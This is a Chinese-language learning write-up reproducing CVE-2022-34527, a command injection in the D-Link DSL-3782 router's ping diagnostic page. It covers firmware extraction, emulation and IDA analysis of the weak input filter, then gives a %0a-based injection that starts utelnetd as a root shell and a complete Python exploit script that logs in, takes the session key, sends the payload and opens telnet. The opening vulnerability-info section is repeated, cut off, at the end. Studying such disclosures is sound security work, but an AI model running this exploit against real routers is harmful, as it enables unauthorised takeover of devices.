
# 命令注入漏洞CVE-2022-34527复现（学习记录）

## 0x01 漏洞信息

- CVE编号：CVE-2022-34527

- 漏洞描述：D-Link DSL-3782 v1.03 and below was discovered to contain a command injection vulnerability via the function `byte_4C0160`.

- 设备型号：D-Link DSL-3782

- 固件版本：`DSL-3782_A1_EU_1.01`

- 厂商官网：

- 固件地址：

> 漏洞披露的信息很模糊，只是说D-Link DSL-3782 v1.03及以下版本中存在一个命令注入漏洞，相关的函数为`byte_4C0160`。
>
> 若是在IDA中，`byte_4C0160`应该是一个字符串，IDA中的未知函数是`sub_xx`格式。
>
> 本文中复现的版本是D-Link DSL-3782 v1.0。

## 0x02 固件分析

### 2.1 固件提取

使用`binwalk`对固件解包，获取文件系统。

```bash
binwalk -Me DSL-3782\_A1\_EU\_1.01\_09292016.bin
```

> 在文件系统中看到了`boaroot`文件夹，猜测该路由器使用的是Boa服务器。Boa服务器是一个小巧高效的web服务器，是一个运行于unix或linux下的，支持CGI的、适合于嵌入式系统的单任务的http服务器，源代码开放、性能高。作为一种单任务Web服务器，Boa只能依次完成用户的请求，而不会fork出新的进程来处理并发连接请求。但Boa支持CGI，能够为CGI程序fork出一个进程来执行。

查看系统启动文件：`/usr/etc/init.d/rcS`

> 根据启动信息，路由器的Web服务器为Boa，Web根目录为`/boaroot`。

> 在文件系统中发现了`utelnetd`命令，可用于验证命令注入漏洞。

### 2.2 固件模拟

查看完文件系统后模拟运行固件，定位到相关文件后再详细分析。根据漏洞信息说是一个命令注入，那么直接模拟固件去后台看看有没有可疑的注入点。

> 默认密码为`admin`。

## 0x03 漏洞分析

在后台中查找到如下页面：

根据之前的复现经验，命令执行漏洞很有可能出现在ping测试这种页面中。使用`burpsuit`抓包查看一下：

发现`ping test`相关文件为：`/cgi-bin/New_GUI/Set/Diagnostics.asp`，查看一下该文件的内容。

根据文件内容判断这是在通过`WebApi`处理前端提交过来的数据，由前面的Burpsuit抓包的内容可知前端会将`Type`和`Addr`的数据传到服务器。查找一下关键字：`Diagnostics_Entry`看看传入的数据是由哪个文件处理的。

通过查找内容获得文件`userfs/bin/cfg_manager`，将该文件拿到IDA中分析。通过关键词查找，成功定位到函数：

分析整理一下：

通过分析可知上述代码的含义为判断前端传来的`Type`参数是为`p`还是`t`，对应的是`Ping test`和`Trace route`。命令执行的关键点在于`byte_4C0480`是否能被前端输入所控制，通过引用查看一下`byte_4C0480`的来源。

找到`byte_4C0480`的来源但是发现不能直接通过F5反汇编为伪代码，需要修正函数。在函数的开始地址处按下P修正后再F5即可得到反汇编的伪代码。

通过分析上述代码可知获取到前端输入的`Addr`后通过`sub_46258C`进行字符检查，但是检查不充分，可通过如`%0a(\n)`绕过。检查后使用`sprintf`函数拼接命令字符串并通过`pthread_create`传入到线程回调函数中由`system`函数执行。这是一个由于对前端输入数据检查不充分导致的命令执行漏洞。

## 0x04 漏洞复现

通过抓包查看发现POST数据的时候带着`session`，不能通过`Repeater`改包发送了，但是可以通过`Intercept`来更改。在`Addr`处使用的注入命令为：`utelnetd -p 7080 -l /bin/sh`

使用`nc`连接成功，取得`shell`。

## 0x05 漏洞EXP

```python
import requests
import urllib
import os
from time import sleep
from urllib.parse import unquote
server = "192.168.1.1"
main_url = "http://192.168.1.1:80"
headers = {
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36",
}
def login():
s = requests.Session()
s.verify = False
url = main_url + "/cgi-bin/Login.asp?User=admin&Pwd=admin&_=1690122728925"
resp = s.get(url,headers=headers,timeout=10)
print(resp.text)
def get_session_key():
s = requests.Session()
s.verify = False
url = main_url + "/cgi-bin/get/New_GUI/get_sessionKey.asp"
resp = s.get(url,headers=headers,timeout=10)
sessionKey = resp.text
print(sessionKey)
return sessionKey
def exp(sessionKey=None):
cmd = "%0autelnetd -p 8090 -l /bin/sh%0a"
s = requests.Session()
s.verify = False
params = {"Type":"p", "sessionKey":urllib.parse.unquote(sessionKey),"Addr":urllib.parse.unquote(cmd)}
url = main_url + "/cgi-bin/New_GUI/Set/Diagnostics.asp"
resp = s.post(url,data=params,headers=headers,timeout=100000)
print(resp.text)
if __name__ == '__main__':
print("\n[*] Connection ",main_url);
login()
print("[*] Getting session key")
sessionKey = get_session_key()
print("[*] Sending payload")
exp(sessionKey=sessionKey)
print("[*] Running Telnetd Service")
print("[*] Opening Telnet Connection\n")
sleep(3)
os.system('telnet ' + str(server) + ' 8090')
```

EXP执行后成功取得`shell`：

## 0x06 复现总结

和前一篇命令执行漏洞一样，此漏洞是因为字符过滤不完全导致的命令执行漏洞。当遇到CVE漏洞信息描述的比较模糊时，模拟固件去后台看看有没有可疑漏洞点很有必要，这样可以快速定位到漏洞页面或者相关文件。

## 0x07 参考文章

- D-Link DSL-3782 代码注入漏洞CVE-2022-34527分析- IOTsec-Zone物联网安全社区

- 

- CVE-2022-34527_D-Link_DSL-3782_Router_command_injection/CVE-2022-34527_D-Link_DSL-3782_Router_command_injection.md at master · FzBacon/CVE-2022-34527_D-Link_DSL-3782_Router_command_injection (github.com)

## 0x01 漏洞信息

- CVE编号：CVE-2022-34527

- 漏洞描述：D-Link DSL-3782 v1.03 and below was discovered to contain a command injection vulnerability via the function `byte_4C0160`.

- 设备型号：D-Link DSL-3782

- 固件版本：`DSL-3782_A1_EU_1.01`

- 厂商官网：
